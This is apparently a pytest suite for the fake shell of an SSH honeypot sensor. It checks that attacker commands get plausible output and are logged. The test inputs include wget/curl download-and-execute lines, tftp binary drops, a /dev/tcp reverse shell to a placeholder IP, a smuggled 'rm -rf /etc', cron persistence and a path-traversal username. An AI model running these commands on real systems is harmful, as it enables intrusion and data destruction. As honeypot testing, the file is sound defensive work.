from __future__ import annotations

from suckerpot_common import EventType

from ssh_sensor.shell.interp import Shell


def run(sh: Shell, line: str) -> str:
    return sh.run_line(line).output


def test_basic_info_commands(shell: Shell) -> None:
    assert run(shell, "whoami") == "root\n"
    assert run(shell, "hostname") == "srv-web01\n"
    assert run(shell, "uname -a").startswith("Linux srv-web01 6.8.0-100-generic #100-Ubuntu SMP")
    assert run(shell, "uname -m") == "x86_64\n"
    assert run(shell, "id") == "uid=0(root) gid=0(root) groups=0(root)\n"
    assert run(shell, "nproc") == "2\n"
    assert "Ubuntu 24.04" in run(shell, "cat /etc/os-release")


def test_pipes_and_cpuinfo(shell: Shell) -> None:
    assert run(shell, "cat /proc/cpuinfo | grep name | wc -l") == "2\n"
    assert run(
        shell, "cat /proc/cpuinfo | grep 'model name' | head -n 1 | cut -d: -f2"
    ).strip() == ("Intel(R) Xeon(R) Platinum 8259CL CPU @ 2.50GHz")
    assert run(shell, "cat /etc/passwd | awk -F: '{print $1}' | head -1") == "root\n"


def test_chaining_and_status(shell: Shell) -> None:
    assert run(shell, "false && echo no; echo yes") == "yes\n"
    assert run(shell, "false || echo fallback") == "fallback\n"
    assert run(shell, "echo $?") == "0\n"
    run(shell, "nonexistent")
    assert run(shell, "echo $?") == "127\n"


def test_unknown_and_dot_slash(shell: Shell) -> None:
    assert run(shell, "frobnicate --now") == "bash: frobnicate: command not found\n"
    assert run(shell, "./nothing") == "bash: ./nothing: No such file or directory\n"


def test_filesystem_writes_are_copy_on_write(shell: Shell) -> None:
    run(shell, "cd /tmp; echo hello > a.txt; echo world >> a.txt")
    assert run(shell, "cat /tmp/a.txt") == "hello\nworld\n"
    run(shell, "mkdir -p /tmp/x/y; touch /tmp/x/y/z; rm -rf /tmp/x")
    assert "No such file" in run(shell, "ls /tmp/x")
    run(shell, "rm /etc/hostname")
    assert "No such file" in run(shell, "cat /etc/hostname")
    # a second session sees the pristine base image
    other = Shell(
        cfg=shell.cfg,
        base=shell.base,
        profile=shell.profile,
        username="root",
        client_ip="203.0.113.10",
        client_port=1,
    )
    assert run(other, "cat /etc/hostname") == "srv-web01\n"
    assert "No such file" in run(other, "cat /tmp/a.txt")


def test_fs_size_cap(shell: Shell) -> None:
    big = "x" * 3000
    for _ in range(600):
        shell.run_line(f"echo {big} >> /tmp/big")
    assert "No space left" in run(shell, f"echo {big} >> /tmp/big")


def test_ls_formats(shell: Shell) -> None:
    out = run(shell, "ls -la /")
    assert out.startswith("total ")
    assert "drwxrwxrwt" in out and "lrwxrwxrwx" in out
    assert "var" in run(shell, "ls /")


def test_wget_records_download_and_creates_file(shell: Shell) -> None:
    out = run(shell, "cd /tmp; wget http://198.51.100.7/x.sh; chmod +x x.sh; ./x.sh")
    assert "saved" in out
    events = [e for e in shell.pending if e.type == EventType.download_attempt]
    assert events[0].data["url"] == "http://198.51.100.7/x.sh"
    assert events[0].data["tool"] == "wget"
    assert shell.fs.exists("/tmp/x.sh")


def test_binary_drop_fails_plausibly(shell: Shell) -> None:
    out = run(shell, "cd /tmp && curl -s -o bot http://198.51.100.7/bot && chmod 755 bot && ./bot")
    assert "Segmentation fault" in out or "Exec format error" in out
    assert shell.pending[0].data["tool"] == "curl"


def test_tftp_and_ftpget_and_scp(shell: Shell) -> None:
    run(shell, "cd /tmp; tftp -g -l m -r m.mips 198.51.100.8; ftpget -v -u a -p b 198.51.100.9 f f")
    run(shell, "scp user@198.51.100.10:/x/y .")
    tools = [e.data["tool"] for e in shell.pending]
    assert tools == ["tftp", "ftpget", "scp"]


def test_busybox_probe(shell: Shell) -> None:
    assert run(shell, "/bin/busybox ABCD") == "ABCD: applet not found\n"
    assert "BusyBox" in run(shell, "busybox")


def test_sudo_su_and_exit_stack() -> None:
    from ssh_sensor.config import Config
    from ssh_sensor.shell.baseimage import build_base_image, derive_profile

    profile = derive_profile("s", "srv-web01")
    sh = Shell(
        cfg=Config(command_delay=False),
        base=build_base_image(profile),
        profile=profile,
        username="ubuntu",
        client_ip="203.0.113.9",
        client_port=1,
    )
    assert run(sh, "whoami") == "ubuntu\n"
    assert run(sh, "sudo whoami") == "root\n"
    assert run(sh, "cat /etc/shadow") != "" and "Permission denied" in run(sh, "cat /etc/shadow")
    run(sh, "sudo -i")
    assert run(sh, "whoami") == "root\n"
    run(sh, "exit")
    assert run(sh, "whoami") == "ubuntu\n"
    assert "Authentication failure" in run(sh, "su -")


def test_unknown_login_gets_a_home() -> None:
    from ssh_sensor.config import Config
    from ssh_sensor.shell.baseimage import build_base_image, derive_profile

    profile = derive_profile("s", "srv-web01")
    sh = Shell(
        cfg=Config(command_delay=False),
        base=build_base_image(profile),
        profile=profile,
        username="../../etc/evil user",
        client_ip="203.0.113.9",
        client_port=1,
    )
    assert sh.user.name == "etcevil" or sh.user.name.isalnum()
    assert sh.cwd.startswith("/home/")


def test_substitution_is_allowlisted(shell: Shell) -> None:
    assert run(shell, "echo $(uname -m)") == "x86_64\n"
    assert run(shell, "echo $(rm -rf /etc)x") == "x\n"
    assert shell.fs.exists("/etc/passwd")
    assert run(shell, "echo ${NOPE:-dflt} $HOME") == "dflt /root\n"


def test_quotes_and_escapes(shell: Shell) -> None:
    assert run(shell, "echo 'a  b' \"c   d\" e\\ f") == "a  b c   d e f\n"
    assert run(shell, "echo -e 'a\\tb'") == "a\tb\n"
    assert "unexpected EOF" in run(shell, "echo 'oops")


def test_exit_and_output_cap(shell: Shell) -> None:
    res = shell.run_line("exit")
    assert res.exit
    shell2_out = run(shell, "echo " + "A" * 70000)
    assert len(shell2_out) < 70000 and "truncated" in shell2_out


def test_crontab_and_passwd(shell: Shell) -> None:
    assert "no crontab" in run(shell, "crontab -l")
    run(shell, "echo '* * * * * /tmp/x' | crontab -")
    assert run(shell, "crontab -l") == "* * * * * /tmp/x\n"
    assert "password unchanged" in run(shell, "passwd")


def test_dev_tcp_reverse_shell_fails(shell: Shell) -> None:
    out = run(shell, "bash -i >& /dev/tcp/198.51.100.4/4444 0>&1")
    assert "Connection refused" in out


def test_redirect_stderr(shell: Shell) -> None:
    assert run(shell, "ls /nope 2>/dev/null; echo done") == "done\n"
    assert "No such file" in run(shell, "ls /nope 2>&1")


def test_glob(shell: Shell) -> None:
    run(shell, "cd /tmp; touch a.log b.log c.txt")
    assert run(shell, "ls *.log") == "a.log\nb.log\n" or run(shell, "ls *.log").split() == [
        "a.log",
        "b.log",
    ]
